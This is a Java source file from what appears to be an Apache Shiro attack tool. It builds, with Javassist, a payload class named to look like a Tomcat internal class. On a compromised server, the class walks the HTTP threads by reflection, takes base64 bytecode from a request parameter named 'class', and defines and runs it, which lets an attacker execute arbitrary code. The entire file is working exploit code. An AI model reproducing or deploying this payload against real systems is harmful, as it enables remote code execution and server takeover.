package org.shiroattack;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;


public class DefineClass {
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("org.apache.catalina.x.ACS" + System.nanoTime());

        clazz.addMethod(CtMethod.make("    private static Object getFieldValue(Object obj, String field) throws Exception {\n" +
                "        java.lang.reflect.Field f = null;\n" +
                "        Class cls = obj.getClass();\n" +
                "\n" +
                "        while (cls != Object.class) {\n" +
                "            try {\n" +
                "                f = cls.getDeclaredField(field);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e) {\n" +
                "                cls = cls.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f == null) {\n" +
                "            throw new NoSuchFieldException(field);\n" +
                "        } else {\n" +
                "            f.setAccessible(true);\n" +
                "            return f.get(obj);\n" +
                "        }\n" +
                "    }\n", clazz));

        clazz.addConstructor(CtNewConstructor.make("    public DefineClass() throws Exception {\n" +
                "        boolean flag = false;\n" +
                "        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "\n" +
                "        for (int i = 0; i < threads.length; ++i) {\n" +
                "            Thread thread = threads[i];\n" +
                "            if (thread != null) {\n" +
                "                String threadName = thread.getName();\n" +
                "                if (!threadName.contains(\"exec\") && threadName.contains(\"http\")) {\n" +
                "                    Object obj = getFieldValue(thread, \"target\");\n" +
                "                    if (obj instanceof Runnable) {\n" +
                "                        try {\n" +
                "                            obj = getFieldValue(getFieldValue(getFieldValue(obj, \"this$0\"), \"handler\"), \"global\");\n" +
                "                        } catch (Exception e) {\n" +
                "                            continue;\n" +
                "                        }\n" +
                "\n" +
                "                        java.util.List processors = (java.util.List) getFieldValue(obj,\"processors\");\n" +
                "\n" +
                "                        for (int n = 0; n < processors.size(); ++n) {\n" +
                "                            Object processor = processors.get(n);\n" +
                "                            obj = getFieldValue(processor, \"req\");\n" +
                "\n" +
                "                            Object conreq = obj.getClass().getMethod(\"getNote\", new Class[]{int.class}).invoke(obj, new Object[]{new Integer(1)});\n" +
                "\n" +
                "                            String c = (String) conreq.getClass().getMethod" +
                "(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"class\")});\n" +
                "\n" +
                "                            if (c != null && !c.isEmpty()) {\n" +
                "                                byte[] bytecodes = new sun.misc.BASE64Decoder().decodeBuffer(c);\n" +
                "        \n" +
                "                                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                "                                defineClassMethod.setAccessible(true);\n" +
                "        \n" +
                "                                Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n" +
                "        \n" +
                "                                cc.newInstance().equals(conreq);\n" +
                "                                flag = true;\n" +
                "                            }\n" +
                "                            if (flag) {\n" +
                "                                break;\n" +
                "                            }\n" +
                "                        }\n" +
                "                        if (flag) {\n" +
                "                            break;\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }\n" +
                "    }\n", clazz));

        // 兼容低版本JDK
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }

}
